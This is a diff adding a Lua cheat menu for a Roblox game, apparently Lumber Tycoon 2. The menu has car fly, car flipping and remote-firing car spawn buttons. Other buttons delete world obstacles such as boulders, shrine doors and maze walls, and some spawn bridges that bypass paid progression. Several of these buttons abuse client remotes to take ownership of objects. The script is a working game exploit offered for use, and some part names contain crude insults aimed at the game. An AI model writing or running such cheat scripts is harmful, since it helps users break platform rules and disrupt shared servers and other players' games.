+            	        game.ReplicatedStorage.Interaction.RemoteProxy:FireServer(SpawnPad.ButtonRemote_SpawnButton)
+                    end
+                end
+            end
+        end
+    end
+end)
+
+mouse = game.Players.LocalPlayer:GetMouse()
+mouse.KeyDown:connect(function(key)
+    if key:lower() == "c" then
+	    if mouse.Target.Parent:FindFirstChild("ButtonRemote_SpawnButton") then 
+            SpawnPad = mouse.Target.Parent
+            Spawned = false
+            Spawning = false
+            game.ReplicatedStorage.Interaction.RemoteProxy:FireServer(mouse.Target.Parent.ButtonRemote_SpawnButton)
+	    else 
+		    Spawned = true
+		    Spawning = false
+		end
+    end
+end)
+end
+spawn(function()
+	repeat
+		wait()
+	if Spawned == true then
+		Spawned = false
+		game:GetService("StarterGui"):SetCore("SendNotification", {
+		  Title = "Pink Car",
+		  Text = "Successful Spawned."
+		})
+	end
+	until Spawned == true
+end)
+end)
+
+InfoText35.Name = "InfoText2"
+InfoText35.Parent = MainFrame
+InfoText35.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+InfoText35.BorderColor3 = Color3.new(0, 0, 0)
+InfoText35.BackgroundTransparency = 0.2
+InfoText35.Position = UDim2.new(0, 182, 0, 260)
+InfoText35.Size = UDim2.new(0, 150, 0, 150)
+InfoText35.TextColor3 = Color3.fromRGB(245, 205, 48)
+InfoText35.Font = Enum.Font.Fantasy
+InfoText35.Text =  "Johiro Car Rotater\n\n1.Just sit in your car.\n2.Click Car Rotater.\n3.Press R on your keyboard to turn your car back on its wheels."
+InfoText35.TextSize = 14
+InfoText35.TextWrapped = true
+InfoText35.Visible = false
+
+CarRotate.MouseEnter:connect(function()
+InfoText35.Visible = true
+end)
+
+CarRotate.MouseLeave:connect(function()
+InfoText35.Visible = false
+end)
+
+CarRotate.Name = "CarRotate"
+CarRotate.Parent = toolaFrame
+CarRotate.BackgroundColor3 = Color3.new(0, 0, 0)
+CarRotate.BorderColor3 = Color3.new(1, 0, 0)
+CarRotate.BackgroundTransparency = 0.6
+CarRotate.Position =  UDim2.new(0, 3, 0, 72)
+CarRotate.Size = UDim2.new(0, 140, 0, 20)
+CarRotate.Font = Enum.Font.Fantasy
+CarRotate.Text = "Car Rotater"
+CarRotate.TextColor3 = Color3.new(1, 1, 1)
+CarRotate.TextSize = 14
+
+CarRotates.Name = "CarRotates"
+CarRotates.Parent = toolaFrame
+CarRotates.BackgroundColor3 = Color3.new(0, 0, 0)
+CarRotates.BorderColor3 = Color3.new(1, 0, 0)
+CarRotates.BackgroundTransparency = 0.6
+CarRotates.Position = UDim2.new(0, 147, 0, 72)
+CarRotates.Size = UDim2.new(0, 21, 0, 20)
+CarRotates.Font = Enum.Font.Fantasy
+CarRotates.Text = "R"
+CarRotates.TextColor3 = Color3.new(1, 1, 1)
+CarRotates.TextSize = 14
+
+CarRotate.MouseButton1Click:connect(function()
+  makesound("rbxassetid://156785206")
+	local Turn = game:GetService("Players").LocalPlayer:GetMouse()
+	function Turn2(key)
+        	if (key == "r") then
+			function RotateCar()
+    if game.Players.LocalPlayer.Character then 
+        Character = game.Players.LocalPlayer.Character
+        if Character.Humanoid.SeatPart ~= nil then 
+            Car = Character.Humanoid.SeatPart.Parent
+            spawn(function()
+            local Pos = CFrame.new(Car.Main.Position)
+                for i=1,5 do
+                    wait()
+                    Car:SetPrimaryPartCFrame(Pos * CFrame.Angles(math.rad(Character.HumanoidRootPart.Orientation.x), math.rad(Character.HumanoidRootPart.Orientation.y), 0))
+                    game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(Car.Main)
+                    game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Car.Main)
+                end
+            end)
+        end
+    end
+end
+RotateCar()
+			end
+		end
+Turn.KeyDown:connect(Turn2)
+end)
+
+
+
+Carfly.Name = "Carfly"
+Carfly.Parent = toolaFrame
+Carfly.BackgroundColor3 = Color3.new(0, 0, 0)
+Carfly.BorderColor3 = Color3.new(1, 0, 0)
+Carfly.BackgroundTransparency = 0.6
+Carfly.Position =  UDim2.new(0, 3, 0, 95)
+Carfly.Size = UDim2.new(0, 140, 0, 20)
+Carfly.Font = Enum.Font.Fantasy
+Carfly.Text = "Carfly"
+Carfly.TextColor3 = Color3.new(1, 1, 1)
+Carfly.TextSize = 14
+
+CarflyA.Name = "CarflyAs"
+CarflyA.Parent = toolaFrame
+CarflyA.BackgroundColor3 = Color3.new(0, 0, 0)
+CarflyA.BorderColor3 = Color3.new(1, 0, 0)
+CarflyA.BackgroundTransparency = 0.6
+CarflyA.Position = UDim2.new(0, 147, 0, 95)
+CarflyA.Size = UDim2.new(0, 21, 0, 20)
+CarflyA.Font = Enum.Font.Fantasy
+CarflyA.Text = "Z"
+CarflyA.TextColor3 = Color3.new(1, 1, 1)
+CarflyA.TextSize = 14
+
+Carfly.MouseButton1Click:connect(function()
+  local hint = Instance.new("Hint",game.Players.LocalPlayer.PlayerGui)
+   hint.Text = "Press Z To Toggle"
+   hint.Name = game.JobId
+repeat wait()
+    until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
+local mouse = game.Players.LocalPlayer:GetMouse()
+repeat wait() until mouse
+local plr = game.Players.LocalPlayer
+local torso = plr.Character.Torso
+local flying = true
+local deb = true
+local ctrl = {f = 0, b = 0, l = 0, r = 0}
+local lastctrl = {f = 0, b = 0, l = 0, r = 0}
+local maxspeed = 250
+local speed = 0
+ 
+function Fly()
+local bg = Instance.new("BodyGyro", torso)
+bg.P = 9e4
+bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+bg.cframe = torso.CFrame
+local bv = Instance.new("BodyVelocity", torso)
+bv.velocity = Vector3.new(0,0.1,0)
+bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
+repeat wait()
+plr.Character.Humanoid.PlatformStand = false
+if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
+speed = speed+125.0+(speed/maxspeed)
+if speed > maxspeed then
+speed = maxspeed
+end
+elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
+speed = speed-250
+if speed < 0 then
+speed = 0
+end
+end
+if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
+bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
+lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
+elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
+bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
+else
+bv.velocity = Vector3.new(0,0.1,0)
+end
+bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
+until not flying
+ctrl = {f = 0, b = 0, l = 0, r = 0}
+lastctrl = {f = 0, b = 0, l = 0, r = 0}
+speed = 0
+bg:Destroy()
+bv:Destroy()
+plr.Character.Humanoid.PlatformStand = false
+end
+mouse.KeyDown:connect(function(key)
+if key:lower() == "z" then
+if flying then flying = false
+else
+flying = true
+Fly()
+end
+elseif key:lower() == "w" then
+ctrl.f = 1
+elseif key:lower() == "s" then
+ctrl.b = -1
+elseif key:lower() == "a" then
+ctrl.l = -1
+elseif key:lower() == "d" then
+ctrl.r = 1
+end
+end)
+mouse.KeyUp:connect(function(key)
+if key:lower() == "w" then
+ctrl.f = 0
+elseif key:lower() == "s" then
+ctrl.b = 0
+elseif key:lower() == "a" then
+ctrl.l = 0
+elseif key:lower() == "d" then
+ctrl.r = 0
+end
+wait(5)
+hint:Destroy()
+end)
+Fly()
+end)
+
+Brid.Name = "Bridge"
+Brid.Parent = toolaFrame
+Brid.BackgroundColor3 = Color3.new(0, 0, 0)
+Brid.BorderColor3 = Color3.new(1, 0, 0)
+Brid.BackgroundTransparency = 0.6
+Brid.Position =  UDim2.new(0, 3, 0, 118)
+Brid.Size = UDim2.new(0, 115, 0, 20)
+Brid.Font = Enum.Font.Fantasy
+Brid.Text = "Bridge"
+Brid.TextColor3 = Color3.new(1, 1, 1)
+Brid.TextSize = 14
+
+Bridup.Name = "Bridge"
+Bridup.Parent = toolaFrame
+Bridup.BackgroundColor3 = Color3.new(0, 0, 0)
+Bridup.BorderColor3 = Color3.new(1, 0, 0)
+Bridup.BackgroundTransparency = 0.6
+Bridup.Position =  UDim2.new(0, 147, 0, 118)
+Bridup.Size = UDim2.new(0, 21, 0, 20)
+Bridup.Font = Enum.Font.Fantasy
+Bridup.Text = "U"
+Bridup.TextColor3 = Color3.new(1, 1, 1)
+Bridup.TextSize = 14
+
+BridDown.Name = "Bridge"
+BridDown.Parent = toolaFrame
+BridDown.BackgroundColor3 = Color3.new(0, 0, 0)
+BridDown.BorderColor3 = Color3.new(1, 0, 0)
+BridDown.BackgroundTransparency = 0.6
+BridDown.Position =  UDim2.new(0, 122, 0, 118)
+BridDown.Size = UDim2.new(0, 21, 0, 20)
+BridDown.Font = Enum.Font.Fantasy
+BridDown.Text = "D"
+BridDown.TextColor3 = Color3.new(1, 1, 1)
+BridDown.TextSize = 14
+
+local BridgeD = false
+BridDown.MouseButton1Click:connect(function()
+  makesound("rbxassetid://156785206")
+	if BridgeD == false then
+			for _,v in pairs(game.workspace.Bridge.VerticalLiftBridge.Lift:GetChildren()) do
+			v.CFrame = v.CFrame + Vector3.new(0, -26, 0)
+			end
+		BridgeD = true
+	end
+end)
+
+Bridup.MouseButton1Click:connect(function()
+  makesound("rbxassetid://156785206")
+	if BridgeD == true then
+
+			for _,v in pairs(game.workspace.Bridge.VerticalLiftBridge.Lift:GetChildren()) do
+			v.CFrame = v.CFrame + Vector3.new(0, 26, 0)
+			end
+		BridgeD = false
+	end
+end)
+
+
+
+
+ModToolsa.Name = "ModToolsa"
+ModToolsa.Parent = toolaFrame
+ModToolsa.BackgroundColor3 = Color3.new(255, 0, 0)
+ModToolsa.BackgroundTransparency = 0
+ModToolsa.BorderColor3 = Color3.fromRGB(151, 0, 0)
+ModToolsa.Position = UDim2.new(0, 2, 0, 141)
+ModToolsa.Size = UDim2.new(0, 166, 0, 20)
+ModToolsa.Font = Enum.Font.Fantasy
+ModToolsa.Text = "--Mod Tools--"
+ModToolsa.TextColor3 = Color3.new(1, 1, 1)
+ModToolsa.TextSize = 14
+
+RemoveTitle.Name = "RemoveTitle"
+RemoveTitle.Parent = toolaFrame
+RemoveTitle.BackgroundColor3 = Color3.new(0, 0, 0)
+RemoveTitle.BorderColor3 = Color3.new(1, 0, 0)
+RemoveTitle.BackgroundTransparency = 0.6
+RemoveTitle.Position = UDim2.new(0, 3, 0, 164)
+RemoveTitle.Size = UDim2.new(0, 165, 0, 20)
+RemoveTitle.Font = Enum.Font.Fantasy
+RemoveTitle.Text = "-- Removing --"
+RemoveTitle.TextColor3 = Color3.new(0, 1, 0)
+RemoveTitle.TextSize = 15
+
+LavaBoulders.Name = "LavaBoulders"
+LavaBoulders.Parent = toolaFrame
+LavaBoulders.BackgroundColor3 = Color3.new(0, 0, 0)
+LavaBoulders.BorderColor3 = Color3.new(1, 0, 0)
+LavaBoulders.BackgroundTransparency = 0.6
+LavaBoulders.Position = UDim2.new(0, 3, 0, 187)
+LavaBoulders.Size = UDim2.new(0, 165, 0, 20)
+LavaBoulders.Font = Enum.Font.Fantasy
+LavaBoulders.Text = "Lava Boulders"
+LavaBoulders.TextColor3 = Color3.new(1, 1, 1)
+LavaBoulders.TextSize = 14
+
+LavaBoulders.MouseButton1Click:Connect(function()
+	local destroy = true
+
+	local boulders = workspace.Region_Volcano:FindFirstChild("PartSpawner")
+
+	while destroy == true do
+    	for i, v in pairs(boulders:GetChildren()) do
+        	v:Destroy()
+    	end
+    	wait(2)
+	end
+end)
+
+IceBoulders.Name = "IceBoulders"
+IceBoulders.Parent = toolaFrame
+IceBoulders.BackgroundColor3 = Color3.new(0, 0, 0)
+IceBoulders.BorderColor3 = Color3.new(1, 0, 0)
+IceBoulders.BackgroundTransparency = 0.6
+IceBoulders.Position = UDim2.new(0, 3, 0, 210)
+IceBoulders.Size = UDim2.new(0, 165, 0, 20)
+IceBoulders.Font = Enum.Font.Fantasy
+IceBoulders.Text = "Ice Boulders"
+IceBoulders.TextColor3 = Color3.new(1, 1, 1)
+IceBoulders.TextSize = 14
+IceBoulders.MouseButton1Click:Connect(function()
+	local remove = true
+
+	local boulders = workspace.Region_Snow:FindFirstChild("PartSpawner")
+
+	while remove == true do
+    	for i, v in pairs(boulders:GetChildren()) do
+       	 	v:Destroy()
+   	 	end
+    	wait(60)
+	end
+end)
+
+ShrineDoors.Name = "ShrineDoors"
+ShrineDoors.Parent = toolaFrame
+ShrineDoors.BackgroundColor3 = Color3.new(0, 0, 0)
+ShrineDoors.BorderColor3 = Color3.new(1, 0, 0)
+ShrineDoors.BackgroundTransparency = 0.6
+ShrineDoors.Position = UDim2.new(0, 3, 0, 233)
+ShrineDoors.Size = UDim2.new(0, 165, 0, 20)
+ShrineDoors.Font = Enum.Font.Fantasy
+ShrineDoors.Text = "Shrine Doors"
+ShrineDoors.TextColor3 = Color3.new(1, 1, 1)
+ShrineDoors.TextSize = 14
+ShrineDoors.MouseButton1Click:Connect(function()
+	workspace.Region_Mountainside.BoulderRegen.Boulder:Destroy()
+	workspace.Region_Mountainside.Door.Door:Destroy()
+end)
+
+
+MazeWalls.Name = "MazeWalls"
+MazeWalls.Parent = toolaFrame
+MazeWalls.BackgroundColor3 = Color3.new(0, 0, 0)
+MazeWalls.BorderColor3 = Color3.new(1, 0, 0)
+MazeWalls.BackgroundTransparency = 0.6
+MazeWalls.Position = UDim2.new(0, 3, 0, 256)
+MazeWalls.Size = UDim2.new(0, 165, 0, 20)
+MazeWalls.Font = Enum.Font.Fantasy
+MazeWalls.Text = "Maze Walls"
+MazeWalls.TextColor3 = Color3.new(1, 1, 1)
+MazeWalls.TextSize = 14
+MazeWalls.MouseButton1Click:Connect(function()
+	local blockades = workspace.Region_MazeCave.Blockade
+
+	for i, v in pairs(blockades:GetChildren()) do
+    	v:Destroy()
+	end
+end)
+
+BridgesTitle.Name = "BridgesTitle"
+BridgesTitle.Parent = toolaFrame
+BridgesTitle.BackgroundColor3 = Color3.new(0, 0, 0)
+BridgesTitle.BorderColor3 = Color3.new(1, 0, 0)
+BridgesTitle.BackgroundTransparency = 0.6
+BridgesTitle.Position = UDim2.new(0, 3, 0, 279)
+BridgesTitle.Size = UDim2.new(0, 165, 0, 20)
+BridgesTitle.Font = Enum.Font.Fantasy
+BridgesTitle.Text = "-- Bridges --"
+BridgesTitle.TextColor3 = Color3.new(0, 1, 0)
+BridgesTitle.TextSize = 14
+
+PalmBridge.Name = "PalmBridge"
+PalmBridge.Parent = toolaFrame
+PalmBridge.BackgroundColor3 = Color3.new(0, 0, 0)
+PalmBridge.BorderColor3 = Color3.new(1, 0, 0)
+PalmBridge.BackgroundTransparency = 0.6
+PalmBridge.Position = UDim2.new(0, 3, 0, 302)
+PalmBridge.Size = UDim2.new(0, 165, 0, 20)
+PalmBridge.Font = Enum.Font.Fantasy
+PalmBridge.Text = "Main To Palm"
+PalmBridge.TextColor3 = Color3.new(1, 1, 1)
+PalmBridge.TextSize = 14
+PalmBridge.MouseButton1Click:Connect(function()
+	local palm1 = Instance.new("Part", workspace)
+	palm1.Name = "K Truck's Goin' There"
+	palm1.Position = Vector3.new(1753.475, -10, -45.351)
+	palm1.Size = Vector3.new(1600, 1, 50)
+	palm1.BrickColor = BrickColor.Random()
+	palm1.Anchored = true
+end)
+
+SafariBridge.Name = "SafariBridge"
+SafariBridge.Parent = toolaFrame
+SafariBridge.BackgroundColor3 = Color3.new(0, 0, 0)
+SafariBridge.BorderColor3 = Color3.new(1, 0, 0)
+SafariBridge.BackgroundTransparency = 0.6
+SafariBridge.Position = UDim2.new(0, 3, 0, 325)
+SafariBridge.Size = UDim2.new(0, 165, 0, 20)
+SafariBridge.Font = Enum.Font.Fantasy
+SafariBridge.Text = "Main To Safari"
+SafariBridge.TextColor3 = Color3.new(1, 1, 1)
+SafariBridge.TextSize = 14
+SafariBridge.MouseButton1Click:Connect(function()
+	local bridge1 = Instance.new("Part", workspace)
+	bridge1.Name = "Lol We Made Our Own Fuck Your ?100"
+	bridge1.Position = Vector3.new(174.511, 1.049, -882.842)
+	bridge1.Size = Vector3.new(60, 0.1, 350)
+	bridge1.BrickColor = BrickColor.Random()
+	wait(0.5)
+	bridge1.Anchored = true
+
+	local bridge2 = Instance.new("Part", workspace)
+	bridge2.Name = "Lol We Made Our Own Fuck Your ?100 Again"
+	bridge2.Position = Vector3.new(49.602, 1.049, -882.842)
+	bridge2.Size = Vector3.new(60, 0.1, 350)
+	bridge2.BrickColor = BrickColor.Random()
+	wait(0.5)
+	bridge2.Anchored = true
+end)
+
+GoldBridge.Name = "GoldBridge"
+GoldBridge.Parent = toolaFrame
+GoldBridge.BackgroundColor3 = Color3.new(0, 0, 0)
+GoldBridge.BorderColor3 = Color3.new(1, 0, 0)
+GoldBridge.BackgroundTransparency = 0.6
+GoldBridge.Position = UDim2.new(0, 3, 0, 348)
+GoldBridge.Size = UDim2.new(0, 165, 0, 20)
+GoldBridge.Font = Enum.Font.Fantasy
+GoldBridge.Text = "Car To Swamp"
+GoldBridge.TextColor3 = Color3.new(1, 1, 1)
+GoldBridge.TextSize = 14
+GoldBridge.MouseButton1Click:Connect(function()
+	local bridge = Instance.new("Part", workspace)
+	bridge.Name = "Lol We Made Our Own Fuck Your Shitty Broken Dynamite Slab"
+	bridge.Position = Vector3.new(-1331.086, 293.25, 645.301)
+	bridge.Size = Vector3.new(185, 0.1, 60)
+	bridge.Orientation = Vector3.new(0, -75, 0)
+	bridge.BrickColor = BrickColor.Random()
+	wait(0.5)
+	bridge.Anchored = true
+end)
+
+YellowBridge.Name = "YellowBridge"
+YellowBridge.Parent = toolaFrame
+YellowBridge.BackgroundColor3 = Color3.new(0, 0, 0)
+YellowBridge.BorderColor3 = Color3.new(1, 0, 0)
+YellowBridge.BackgroundTransparency = 0.6
+YellowBridge.Position = UDim2.new(0, 3, 0, 371)
+YellowBridge.Size = UDim2.new(0, 165, 0, 20)
+YellowBridge.Font = Enum.Font.Fantasy
+YellowBridge.Text = "Main To Yellow"
+YellowBridge.TextColor3 = Color3.new(1, 1, 1)
+YellowBridge.TextSize = 14
+YellowBridge.MouseButton1Click:Connect(function()
+	local yellow = Instance.new("Part", workspace)
+	yellow.Name = "Lol Truck There Easy"
+	yellow.Position = Vector3.new(-517.915, -12, -392.256)
+	yellow.Size = Vector3.new(1207.06, 1, 1460.09)
+	yellow.BrickColor = BrickColor.Random()
+	yellow.Anchored = true
+end)
+plr = game:GetService("Players").LocalPlayer
+
+Platform.Name = "Platform"
+Platform.Parent = toolaFrame
+Platform.BackgroundColor3 = Color3.new(0, 0, 0)
+Platform.BorderColor3 = Color3.new(1, 0, 0)
+Platform.BackgroundTransparency = 0.6
+Platform.Position = UDim2.new(0, 3, 0, 394)
+Platform.Size = UDim2.new(0, 165, 0, 20)
+Platform.Font = Enum.Font.Fantasy
+Platform.Text = "Platform"
+Platform.TextColor3 = Color3.new(1, 1, 1)
+Platform.TextSize = 14
+Platform.MouseButton1Click:connect(function()
+	local p = Instance.new("Part", workspace)
+	p.Size = Vector3.new(30,0.5,30)
+	p.Anchored = true
+	p.Position = plr.Character.HumanoidRootPart.Position + Vector3.new(0,15,0)
+	plr.Character:MoveTo(p.Position + Vector3.new(0,1,0))
+	spawn(function()
+		while p.Parent do
+			wait(1)
+			if (plr.Character.HumanoidRootPart.Position - p.Position).magnitude > 16 then
+				p:Destroy()
+			end
+		end
+	end)
+end)
+
+Drivable.Name = "Drivable"
+Drivable.Parent = toolaFrame
+Drivable.BackgroundColor3 = Color3.new(0, 0, 0)
+Drivable.BorderColor3 = Color3.new(1, 0, 0)
+Drivable.BackgroundTransparency = 0.6
+Drivable.Position = UDim2.new(0, 3, 0, 417)
+Drivable.Size = UDim2.new(0, 165, 0, 20)
+Drivable.Font = Enum.Font.Fantasy
+Drivable.Text = "Drivable Areas"
+Drivable.TextColor3 = Color3.new(1, 1, 1)
+Drivable.TextSize = 14
+Drivable.MouseButton1Click:Connect(function()
+	local Model = Instance.new("Model", game:GetService("Workspace"))
+	Model.Name = "Lumber"
+	
+	local Part1 = Instance.new("Part", Model)
+	Part1.Name = "Bridge"
+	Part1.Reflectance = 0
+	Part1.Transparency = 0
+	Part1.Anchored = true
+	Part1.Archivable = true
+	Part1.CanCollide = false
+	Part1.Locked = false
+	Part1.BrickColor = BrickColor.new("Medium green")
+	Part1.Material = Enum.Material.Fabric
+	Part1.Position = Vector3.new(4380.8090820313, -11.749999046326, -101.56007385254)
+	Part1.Size = Vector3.new(254.85998535156, 0.10000000149012, 1012.0200805664)
+	Part1.Rotation = Vector3.new(0, 0, 0)
+	
+	local Part2 = Instance.new("Part", Model)
+	Part2.Name = "Part"
+	Part2.Reflectance = 0
+	Part2.Transparency = 0
+	Part2.Anchored = true
+	Part2.Archivable = true
+	Part2.CanCollide = false
+	Part2.Locked = false
+	Part2.BrickColor = BrickColor.new("Medium green")
+	Part2.Material = Enum.Material.Fabric
+	Part2.Position = Vector3.new(-1498.7203369141, 628.11077880859, 1146.8332519531)
+	Part2.Size = Vector3.new(54.889999389648, 0.38999998569489, 46.719993591309)
+	Part2.Rotation = Vector3.new(0, 30, 0)
+	
+	local Part3 = Instance.new("Part", Model)
+	Part3.Name = "RoadVol"
+	Part3.Reflectance = 0
+	Part3.Transparency = 0
+	Part3.Anchored = true
+	Part3.Archivable = true
+	Part3.CanCollide = false
+	Part3.Locked = false
+	Part3.BrickColor = BrickColor.new("Medium green")
+	Part3.Material = Enum.Material.Fabric
+	Part3.Position = Vector3.new(-604.03656005859, 301.07205200195, 637.69116210938)
+	Part3.Size = Vector3.new(40, 0.20000000298023, 2030.8299560547)
+	Part3.Rotation = Vector3.new(147.75, 55.680000305176, -152.4700012207)
+	
+	local Part4 = Instance.new("Part", Model)
+	Part4.Name = "Water1"
+	Part4.Reflectance = 0
+	Part4.Transparency = 0
+	Part4.Anchored = true
+	Part4.Archivable = true
+	Part4.CanCollide = false
+	Part4.Locked = false
+	Part4.BrickColor = BrickColor.new("Nougat")
+	Part4.Material = Enum.Material.Fabric
+	Part4.Position = Vector3.new(1201.791015625, -11.89999961853, -382.09997558594)
+	Part4.Size = Vector3.new(2048, 0.20000000298023, 2048)
+	Part4.Rotation = Vector3.new(0, 90, 0)
+	
+	local Part5 = Instance.new("Part", Model)
+	Part5.Name = "Water4"
+	Part5.Reflectance = 0
+	Part5.Transparency = 0
+	Part5.Anchored = true
+	Part5.Archivable = true
+	Part5.CanCollide = false
+	Part5.Locked = false
+	Part5.BrickColor = BrickColor.new("Nougat")
+	Part5.Material = Enum.Material.Fabric
+	Part5.Position = Vector3.new(-494.96441650391, -11.89999961853, -866.69287109375)
+	Part5.Size = Vector3.new(2048, 0.20000000298023, 2048)
+	Part5.Rotation = Vector3.new(0, 90, 0)
+	
+	local Part6 = Instance.new("Part", Model)
+	Part6.Name = "Water2"
+	Part6.Reflectance = 0
+	Part6.Transparency = 0
+	Part6.Anchored = true
+	Part6.Archivable = true
+	Part6.CanCollide = false
+	Part6.Locked = false
+	Part6.BrickColor = BrickColor.new("Nougat")
+	Part6.Material = Enum.Material.Fabric
+	Part6.Position = Vector3.new(3233.3588867188, -11.89999961853, -382.09997558594)
+	Part6.Size = Vector3.new(2048, 0.20000000298023, 2048)
+	Part6.Rotation = Vector3.new(0, 90, 0)
+	
+	local Part7 = Instance.new("Part", Model)
+	Part7.Name = "Water3"
+	Part7.Reflectance = 0
+	Part7.Transparency = 0
+	Part7.Anchored = true
+	Part7.Archivable = true
+	Part7.CanCollide = false
+	Part7.Locked = false
+	Part7.BrickColor = BrickColor.new("Nougat")
+	Part7.Material = Enum.Material.Fabric
+	Part7.Position = Vector3.new(1998.6108398438, -11.89999961853, -2371.4619140625)
+	Part7.Size = Vector3.new(2048, 0.20000000298023, 2048)
+	Part7.Rotation = Vector3.new(0, 90, 0)
+	
+	local WedgePart8 = Instance.new("WedgePart", Model)
+	WedgePart8.Name = "UP"
+	WedgePart8.Reflectance = 0
+	WedgePart8.Transparency = 0
+	WedgePart8.Anchored = true
+	WedgePart8.Archivable = true
+	WedgePart8.CanCollide = false
+	WedgePart8.Locked = false
+	WedgePart8.BrickColor = BrickColor.new("Beige")
+	WedgePart8.Material = Enum.Material.Fabric
+	WedgePart8.Position = Vector3.new(341.31372070313, -5.8850064277649, -772.25903320313)
+	WedgePart8.Size = Vector3.new(65.220001220703, 11.829997062683, 159.52000427246)
+	WedgePart8.Rotation = Vector3.new(0, -21.549999237061, 0)
+	
+	local WedgePart9 = Instance.new("WedgePart", Model)
+	WedgePart9.Name = "UP2"
+	WedgePart9.Reflectance = 0
+	WedgePart9.Transparency = 0
+	WedgePart9.Anchored = true
+	WedgePart9.Archivable = true
+	WedgePart9.CanCollide = false
+	WedgePart9.Locked = false
+	WedgePart9.BrickColor = BrickColor.new("Beige")
+	WedgePart9.Material = Enum.Material.Fabric
+	WedgePart9.Position = Vector3.new(384.87704467773, -5.8850121498108, -1050.4354248047)
+	WedgePart9.Size = Vector3.new(65.220001220703, 11.829997062683, 155.8099822998)
+	WedgePart9.Rotation = Vector3.new(180, -25.35000038147, 180)
+	
+	local WedgePart10 = Instance.new("WedgePart", Model)
+	WedgePart10.Name = "Vol1"
+	WedgePart10.Reflectance = 0
+	WedgePart10.Transparency = 0
+	WedgePart10.Anchored = true
+	WedgePart10.Archivable = true
+	WedgePart10.CanCollide = false
+	WedgePart10.Locked = false
+	WedgePart10.BrickColor = BrickColor.new("Medium green")
+	WedgePart10.Material = Enum.Material.Fabric
+	WedgePart10.Position = Vector3.new(-1133.5314941406, 499.67663574219, 943.49224853516)
+	WedgePart10.Size = Vector3.new(39.729999542236, 10.650003433228, 823.29010009766)
+	WedgePart10.Rotation = Vector3.new(-32.25, -55.680000305176, -27.529998779297)
+	
+	local WedgePart11 = Instance.new("WedgePart", Model)
+	WedgePart11.Name = "Vol2"
+	WedgePart11.Reflectance = 0
+	WedgePart11.Transparency = 0
+	WedgePart11.Anchored = true
+	WedgePart11.Archivable = true
+	WedgePart11.CanCollide = false
+	WedgePart11.Locked = false
+	WedgePart11.BrickColor = BrickColor.new("Medium green")
+	WedgePart11.Material = Enum.Material.Fabric
+	WedgePart11.Position = Vector3.new(-1526.9182128906, 623.2353515625, 1112.2694091797)
+	WedgePart11.Size = Vector3.new(33.96000289917, 10.470000267029, 43.559997558594)
+	WedgePart11.Rotation = Vector3.new(0, 32.899997711182, 0)
+	
+	local WedgePart12 = Instance.new("WedgePart", Model)
+	WedgePart12.Name = "Wedge2"
+	WedgePart12.Reflectance = 0
+	WedgePart12.Transparency = 0
+	WedgePart12.Anchored = true
+	WedgePart12.Archivable = true
+	WedgePart12.CanCollide = false
+	WedgePart12.Locked = false
+	WedgePart12.BrickColor = BrickColor.new("Medium green")
+	WedgePart12.Material = Enum.Material.Fabric
+	WedgePart12.Position = Vector3.new(-580.31176757813, 50.62678527832, -2443.0573730469)
+	WedgePart12.Size = Vector3.new(58.749996185303, 1, 69.490005493164)
+	WedgePart12.Rotation = Vector3.new(-179.08000183105, 14.309999465942, -178.72999572754)
+	
+	local WedgePart13 = Instance.new("WedgePart", Model)
+	WedgePart13.Name = "Wedge"
+	WedgePart13.Reflectance = 0
+	WedgePart13.Transparency = 0
+	WedgePart13.Anchored = true
+	WedgePart13.Archivable = true
+	WedgePart13.CanCollide = false
+	WedgePart13.Locked = false
+	WedgePart13.BrickColor = BrickColor.new("Medium green")
+	WedgePart13.Material = Enum.Material.Fabric
+	WedgePart13.Position = Vector3.new(-554.13073730469, 37.368190765381, -2545.1484375)
+	WedgePart13.Size = Vector3.new(59.18998336792, 30.919998168945, 140.86001586914)
+	WedgePart13.Rotation = Vector3.new(0.91999995708466, -14.309999465942, -1.2699999809265)
+	
+	local Part14 = Instance.new("Part", Model)
+	Part14.Name = "Wall"
+	Part14.Reflectance = 0
+	Part14.Transparency = 0.60000002384186
+	Part14.Anchored = false
+	Part14.Archivable = true
+	Part14.CanCollide = true
+	Part14.Locked = false
+	Part14.BrickColor = BrickColor.new("Medium stone grey")
+	Part14.Material = Enum.Material.Fabric
+	Part14.Position = Vector3.new(-1522.0369873047, 632.79083251953, 1160.2779541016)
+	Part14.Size = Vector3.new(46.590003967285, 8.9700002670288, 1.0400000810623)
+	Part14.Rotation = Vector3.new(-180, 60, -180)
+	
+	local Part15 = Instance.new("Part", Model)
+	Part15.Name = "Fence2"
+	Part15.Reflectance = 0
+	Part15.Transparency = 0.5
+	Part15.Anchored = true
+	Part15.Archivable = true
+	Part15.CanCollide = false
+	Part15.Locked = false
+	Part15.BrickColor = BrickColor.new("Beige")
+	Part15.Material = Enum.Material.Fabric
+	Part15.Position = Vector3.new(-620.37908935547, 319.05871582031, 669.19006347656)
+	Part15.Size = Vector3.new(2037.669921875, 16.129999160767, 2)
+	Part15.Rotation = Vector3.new(0.0099999997764826, 30, -17.510000228882)
+	
